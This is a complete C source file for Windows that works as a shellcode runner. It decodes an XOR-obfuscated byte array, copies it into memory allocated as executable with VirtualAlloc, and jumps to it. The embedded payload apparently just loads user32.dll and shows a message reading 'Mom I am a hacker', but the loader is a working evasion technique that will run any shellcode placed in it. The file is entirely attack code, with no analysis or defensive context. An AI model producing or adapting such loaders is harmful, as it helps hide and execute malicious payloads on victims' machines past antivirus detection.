#include <stdio.h>
#include <windows.h>

void xorEncrypt(unsigned char message[], int size, unsigned char key)
{
    for (int i = 0; i < size; i++)
    {
        message[i] ^= key; // Apply XOR encryption
    }
}

int main(void)
{

    unsigned char key = 0xAA;

    unsigned char satanCode[] = {
"\x56\xe2\x2b\x4e\x5a\x55\x55\x55\x42\x66\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xe2\x9b\x78\xfb\xcf\xe2\x21\xf8\xca\xe2\x21\xf8\xb2\xe2\x21\xf8\x8a\xfc\xe2\xa5\x1d\xe0\xe0\xe2\x21\xd8\xfa\xe7\x9b\x63\xe2\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xe2\x21\xf8\x8a\xeb\xfb\x21\xe8\x96\xe2\xab\x7a\xcc\x2b\xd2\xb2\xa1\xa8\xa5\x2f\xd8\xaa\xaa\xaa\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xcd\xe2\xab\x7a\xee\x21\xea\x8a\xe3\xab\x7a\x21\xe2\xb2\xfa\x49\xfc\xe2\x55\x63\xe7\x9b\x63\xeb\x21\x9e\x22\xe2\xab\x7c\xe2\x9b\x6a\x06\xeb\x6b\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x72\xf2\xee\x21\xea\x8e\xe3\xab\x7a\xcc\xeb\x21\xa6\xe2\xee\x21\xea\xb6\xe3\xab\x7a\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\xe2\x21\xb8\x43\xe1\x55\x55\x55\xf7\x42\xa1\xaa\xaa\xaa\xdf\xd9\xcf\xd8\x99\x98\x84\xce\xc6\xc6\xaa\xf3\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe3\x6d\x6b\xaa\xaa\xaa\xaa\x42\xb8\xaa\xaa\xaa\xe7\xc5\xc7\x8a\xe3\x8a\xcb\xc7\x8a\xcb\x8a\xe2\xcb\xc9\xc1\xcf\xd8\xaa\xf0\x42\xb8\xaa\xaa\xaa\xe7\xc5\xc7\x8a\xe3\x8a\xcb\xc7\x8a\xcb\x8a\xe2\xcb\xc9\xc1\xcf\xd8\xaa\xeb\xf2\xe2\x9b\x63\xeb\x10\xef\x29\xfc\xad\x55\x7f\xe2\x9b\x63\xeb\x10\x5a\x1f\x08\xfc\x55\x7f"
    };
    
    size_t size = sizeof(satanCode) - 1;

    xorEncrypt(satanCode, size, key);

    LPVOID lpAlloc = VirtualAlloc(NULL, sizeof(satanCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(lpAlloc, satanCode, sizeof(satanCode));

    DWORD OldProtect;

    BOOL saci = VirtualProtect(lpAlloc, sizeof(satanCode), PAGE_EXECUTE_READWRITE, &OldProtect);

    void (*func)() = (void (*)())lpAlloc;
    func();

    return 0;
}